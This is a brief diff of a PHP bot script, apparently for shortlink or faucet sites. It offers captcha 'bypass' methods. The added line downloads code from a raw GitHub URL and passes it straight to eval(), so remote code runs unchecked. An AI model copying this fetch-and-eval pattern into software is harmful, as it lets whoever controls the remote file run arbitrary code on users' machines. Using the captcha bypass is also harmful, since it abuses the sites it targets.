@@ -36,7 +36,7 @@ c();$methode=methode_captcha();
 ket("","bypass methode",1,$methode[1],2,$methode[2],3,$methode[3]);
 $request_captcha=tx("number").line();
 if(!$methode[$request_captcha]){goto methode;}
-eval(str_replace("request_captcha(",$methode[$request_captcha]."(",file_get_contents("sl.php")));
+eval(str_replace("request_captcha(",$methode[$request_captcha]."(",file_get_contents("https://raw.githubusercontent.com/marcoleus/build/main/shortlinks")));
 
 c().asci(sc).ket("username",$r["username"],"balance",$r["balance"]).line();
 //goto shortlinks;
